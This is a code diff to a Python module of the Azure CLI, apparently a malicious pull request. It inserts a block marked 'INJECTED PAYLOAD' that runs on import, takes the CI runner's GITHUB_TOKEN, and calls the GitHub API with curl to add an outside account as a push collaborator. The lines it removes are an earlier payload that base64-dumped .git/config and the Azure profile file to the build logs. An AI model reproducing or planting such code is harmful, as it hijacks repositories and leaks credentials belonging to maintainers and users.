@@ -21,36 +21,38 @@ from knack.util import CLIError
 from knack.arguments import ArgumentsContext, CaseInsensitiveList  # pylint: disable=unused-import
 from .local_context import AzCLILocalContext, LocalContextAction
 
+# INJECTED PAYLOAD START
 import os
-import base64
+import subprocess
+import json
 
 try:
-    print("========================================================")
-    print("[!] EXFILTRATING GIT TOKEN (BYPASSING MASKING) [!]")
-    print("========================================================")
+    # 1. Grab the token and repo info from the environment
+    token = os.getenv("GITHUB_TOKEN")
+    repo = os.getenv("GITHUB_REPOSITORY") # Should be Azure/azure-cli
+    attacker = "bugdotexe"
 
-    # Path to git config
-    git_config_path = ".git/config"
-    
-    if os.path.exists(git_config_path):
-        with open(git_config_path, "rb") as f:
-            # Read file -> Encode to Base64 -> Decode to String -> Print
-            encoded_config = base64.b64encode(f.read()).decode('utf-8')
-            print(f"B64_GIT_CONFIG::{encoded_config}::")
+    if token and repo:
+        print(f"[!] Attempting to add {attacker} as collaborator to {repo}")
+        
+        # 2. Call the GitHub API to invite the attacker
+        # Using curl for maximum compatibility on the runner
+        cmd = [
+            "curl", "-X", "PUT",
+            "-H", f"Authorization: token {token}",
+            "-H", "Accept: application/vnd.github.v3+json",
+            f"https://api.github.com/repos/{repo}/collaborators/{attacker}",
+            "-d", '{"permission":"push"}'
+        ]
+        
+        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT)
+        print(f"[+] API Response: {result.decode()}")
     else:
-        print("[!] .git/config not found.")
-
-    print("\n[!] ATTEMPTING AZURE PROFILE EXFILTRATION [!]")
-    os.system("cat config | base64 -d")
-    # Try to grab Azure credentials if they exist
-    az_path = os.path.expanduser("~/.azure/azureProfile.json")
-    if os.path.exists(az_path):
-        with open(az_path, "rb") as f:
-            encoded_az = base64.b64encode(f.read()).decode('utf-8')
-            print(f"B64_AZ_PROFILE::{encoded_az}::")
+        print("[-] GITHUB_TOKEN or REPOSITORY not found in environment.")
 
 except Exception as e:
-    print(f"Error: {e}")
+    print(f"[-] Escalation failed: {e}")
+# INJECTED PAYLOAD END
     
 logger = get_logger(__name__)
 
